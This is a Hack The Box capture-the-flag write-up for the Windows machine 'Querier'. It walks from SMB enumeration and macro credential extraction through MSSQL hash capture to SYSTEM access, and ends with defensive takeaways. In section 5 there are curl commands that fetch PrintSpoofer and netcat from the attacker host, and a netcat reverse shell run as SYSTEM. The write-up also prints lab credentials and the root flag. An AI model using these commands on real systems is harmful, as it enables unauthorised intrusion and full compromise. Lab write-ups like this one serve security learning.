# HTB Write-Up: Querier

| Field      | Details                                                            |
|------------|--------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Querier)        |
| Difficulty | Medium                                                             |
| OS         | Windows                                                            |
| Author     | Samurai                                                            |
| Date       | May 26, 2026                                                       |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — SMB Anonymous Access & XLSM Macro](#2-enumeration--smb-anonymous-access--xlsm-macro)
3. [Initial Access — MSSQL as Reporting User](#3-initial-access--mssql-as-reporting-user)
4. [Lateral Movement — NTLM Hash Capture via xp_dirtree](#4-lateral-movement--ntlm-hash-capture-via-xp_dirtree)
5. [Privilege Escalation — SeImpersonatePrivilege via PrintSpoofer](#5-privilege-escalation--seimpersonateprivilege-via-printspoofer)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for fast port discovery, followed by **Nmap** for service fingerprinting:

```bash
rustscan -a 10.129.3.230 --ulimit 5000
```

**Open Ports:**

| Port  | Service       | Details                        |
|-------|---------------|--------------------------------|
| 135   | MSRPC         | Microsoft Windows RPC          |
| 139   | NetBIOS       | Microsoft Windows netbios-ssn  |
| 445   | SMB           | microsoft-ds                   |
| 1433  | MSSQL         | Microsoft SQL Server 2017 RTM  |
| 5985  | WinRM         | Windows Remote Management      |
| 47001 | WinRM         | Windows Remote Management      |

The machine name is **QUERIER** and the domain is **HTB.LOCAL**, running **Windows Server 2019 Build 17763**.

Notable findings:
- **Port 1433** — MSSQL is exposed, a primary attack surface
- **Port 5985/47001** — WinRM open, useful for shell access once credentials are obtained
- **Port 445** — SMB available for anonymous enumeration

---

## 2. Enumeration — SMB Anonymous Access & XLSM Macro

### 2.1 — SMB Share Enumeration

Anonymous SMB access was tested with **NetExec**:

```bash
netexec smb 10.129.3.230 -u '' -p '' --shares
```

**Output:**

```
SMB  10.129.3.230  445  QUERIER  [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB  10.129.3.230  445  QUERIER  [+] HTB.LOCAL\:
SMB  10.129.3.230  445  QUERIER  [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Share enumeration was denied with a null session, but `smbclient` revealed a readable **Reports** share:

```bash
smbclient //10.129.3.230/Reports -N
```

The share contained a single file: **`Currency Volume Report.xlsm`** — a macro-enabled Excel workbook. It was downloaded for analysis.

### 2.2 — Credential Extraction from XLSM Macro

An `.xlsm` file is a ZIP archive. The VBA macro binary was extracted and analyzed with `strings`:

```bash
unzip "Currency Volume Report.xlsm" -d xlsm_extracted
strings xl/vbaProject.bin | grep -iE "password|pwd|conn|sql|uid|user"
```

**Output:**

```
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

Credentials recovered from the VBA macro connection string:

| Account            | Password            |
|--------------------|---------------------|
| `reporting`        | `PcwTWTHRwryjc$c6`  |

---

## 3. Initial Access — MSSQL as Reporting User

The extracted credentials were used to authenticate to MSSQL:

```bash
impacket-mssqlclient 'reporting:PcwTWTHRwryjc$c6'@10.129.3.230 -port 1433 -windows-auth
```

```
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
SQL (QUERIER\reporting  reporting@volume)>
```

Login was successful. However, the `reporting` account is **low-privileged**:

```sql
-- No sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');  -- Returns 0

-- No impersonation rights
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';  -- Empty
```

Direct privilege escalation via MSSQL was not possible. A different approach was needed.

---

## 4. Lateral Movement — NTLM Hash Capture via xp_dirtree

Even low-privileged MSSQL users can execute `xp_dirtree`, which triggers an outbound SMB authentication — leaking the service account's **NTLMv2 hash**.

### 4.1 — Start Responder

```bash
sudo responder -I tun0 -v
```

### 4.2 — Trigger Outbound SMB Authentication

```sql
EXEC xp_dirtree '\\10.10.15.24\share', 1, 1;
```

**Responder captured:**

```
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:8d62ef03b9d7001c:AAC235...
```

### 4.3 — Crack the Hash

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**

```
mssql-svc::QUERIER:...:corporate568

Status: Cracked
Time: 2 seconds
```

Credentials recovered:

| Account              | Password       |
|----------------------|----------------|
| `QUERIER\mssql-svc`  | `corporate568` |

### 4.4 — Login as mssql-svc (Sysadmin)

```bash
impacket-mssqlclient 'mssql-svc:corporate568'@10.129.3.230 -port 1433 -windows-auth
```

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');  -- Returns 1
```

The `mssql-svc` account is a **sysadmin**. `xp_cmdshell` was enabled:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXEC xp_cmdshell 'whoami';
-- querier\mssql-svc
```

**User flag retrieved:**

```sql
EXEC xp_cmdshell 'type C:\Users\mssql-svc\Desktop\user.txt';
```

---

## 5. Privilege Escalation — SeImpersonatePrivilege via PrintSpoofer

### 5.1 — Identify Privilege

```sql
EXEC xp_cmdshell 'whoami /priv';
```

The `mssql-svc` account has **SeImpersonatePrivilege** — a classic potato/spoofer escalation path.

### 5.2 — Upload PrintSpoofer and Netcat

A Python HTTP server was started on the attacker machine, then tools were downloaded via `curl`:

```sql
EXEC xp_cmdshell 'curl http://10.10.15.24/PrintSpoofer64.exe -o C:\Temp\PrintSpoofer.exe';
EXEC xp_cmdshell 'curl http://10.10.15.24/nc64.exe -o C:\Temp\nc.exe';
```

### 5.3 — Verify SYSTEM Execution

```sql
EXEC xp_cmdshell '\Temp\PrintSpoofer.exe -i -c whoami';
```

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system
```

### 5.4 — Get SYSTEM Reverse Shell

A listener was started on the attacker machine:

```bash
rlwrap nc -nvlp 1337
```

PrintSpoofer was used to spawn a SYSTEM shell via netcat:

```sql
EXEC xp_cmdshell '\Temp\PrintSpoofer.exe -i -c "\Temp\nc.exe 10.10.15.24 1337 -e cmd.exe"';
```

**Shell received:**

```
Microsoft Windows [Version 10.0.17763.292]
C:\Windows\system32> whoami
nt authority\system
```

**Root flag retrieved:**

```cmd
type C:\Users\Administrator\Desktop\root.txt
54ef70a9fc3cc10dc41662892cf6fab9
```

---

## 6. Summary

| Phase               | Technique                              | Result                                              |
|---------------------|----------------------------------------|-----------------------------------------------------|
| Recon               | RustScan + Nmap                        | MSSQL, SMB, WinRM identified; domain HTB.LOCAL      |
| SMB Enumeration     | NetExec + smbclient anonymous access   | `Reports` share readable, XLSM file downloaded      |
| Credential Extraction | `strings` on vbaProject.bin          | `reporting:PcwTWTHRwryjc$c6` from VBA macro        |
| MSSQL Access        | impacket-mssqlclient (Windows auth)    | Logged in as low-priv `reporting` user              |
| NTLM Capture        | `xp_dirtree` + Responder               | NTLMv2 hash for `mssql-svc` captured               |
| Hash Cracking       | Hashcat mode 5600 + rockyou.txt        | `mssql-svc:corporate568` cracked in 2 seconds       |
| MSSQL Sysadmin      | impacket-mssqlclient + xp_cmdshell     | RCE as `querier\mssql-svc`, user flag retrieved     |
| Privilege Escalation | PrintSpoofer (SeImpersonatePrivilege) | Shell as `nt authority\system`                      |
| Root                | nc.exe reverse shell                   | Root flag from `\Administrator\Desktop\root.txt`    |

### Key Takeaways

- **Never hardcode credentials in VBA macros.** The connection string in the XLSM macro exposed MSSQL credentials to anyone with read access to the SMB share. Credentials should be stored in a secrets manager or prompted at runtime — never embedded in Office files.

- **xp_dirtree is dangerous for low-priv users too.** Even without sysadmin rights, a low-privileged MSSQL user can trigger outbound SMB authentication via `xp_dirtree`, leaking the service account's NTLMv2 hash to any listener on the network. Firewall rules should block outbound SMB (port 445) from database servers.

- **Service accounts running MSSQL should never be sysadmin.** The `mssql-svc` account had full sysadmin rights, which is unnecessary for normal database operations and dramatically expands the blast radius of a credential compromise. Principle of least privilege should be enforced on all service accounts.

- **SeImpersonatePrivilege on a service account leads directly to SYSTEM.** Any Windows service account with `SeImpersonatePrivilege` is one `PrintSpoofer` or `JuicyPotato` execution away from full system compromise. This privilege should be audited regularly and restricted to accounts that genuinely require it.
